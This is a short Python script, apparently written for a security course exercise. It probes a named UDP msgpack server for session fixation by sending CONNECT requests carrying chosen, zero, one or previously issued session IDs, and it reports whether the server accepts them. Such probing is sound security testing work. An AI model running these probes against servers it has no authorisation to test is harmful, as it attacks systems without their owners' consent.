import socket, msgpack, random, time
HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    return s

def req(s, msg):
    s.send(msgpack.packb(msg))
    try: return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout: return None

def h(): return random.randrange(1, 2**32)

print('=== PROBE 01: Session Fixation ===\n')

# Normal connect to observe session format
s = connect()
s.send(msgpack.packb({'request_type': 1, 'request_handle': h()}))
r = msgpack.unpackb(s.recv(4096), raw=True)
real_session = r[b'session']
print(f'Normal session assigned: {real_session}')
s.close()

# Attempt 1: CONNECT with arbitrary session field
s = connect()
chosen = 12345678
s.send(msgpack.packb({'request_type': 1, 'request_handle': h(), 'session': chosen}))
r = msgpack.unpackb(s.recv(4096), raw=True)
got = r.get(b'session')
print(f'CONNECT with session={chosen} → got session={got}')
if got == chosen:
    print('!! VULNERABLE: server accepted our chosen session ID')
else:
    print('   Server assigned its own session (safe)')
s.close()

# Attempt 2: CONNECT with session=0
s = connect()
s.send(msgpack.packb({'request_type': 1, 'request_handle': h(), 'session': 0}))
r = msgpack.unpackb(s.recv(4096), raw=True)
print(f'CONNECT with session=0 → got session={r.get(b"session")}')
s.close()

# Attempt 3: CONNECT with session=1
s = connect()
s.send(msgpack.packb({'request_type': 1, 'request_handle': h(), 'session': 1}))
r = msgpack.unpackb(s.recv(4096), raw=True)
print(f'CONNECT with session=1 → got session={r.get(b"session")}')
s.close()

# Attempt 4: CONNECT with a previously valid session
s1 = connect()
s1.send(msgpack.packb({'request_type': 1, 'request_handle': h()}))
r1 = msgpack.unpackb(s1.recv(4096), raw=True)
prev_session = r1[b'session']
s1.close()

s2 = connect()
s2.send(msgpack.packb({'request_type': 1, 'request_handle': h(), 'session': prev_session}))
r2 = msgpack.unpackb(s2.recv(4096), raw=True)
got2 = r2.get(b'session')
print(f'CONNECT with prev_session={prev_session} → got session={got2}')
if got2 == prev_session:
    print('!! VULNERABLE: reused/fixated on previous session')
s2.close()
print('\nDone.')
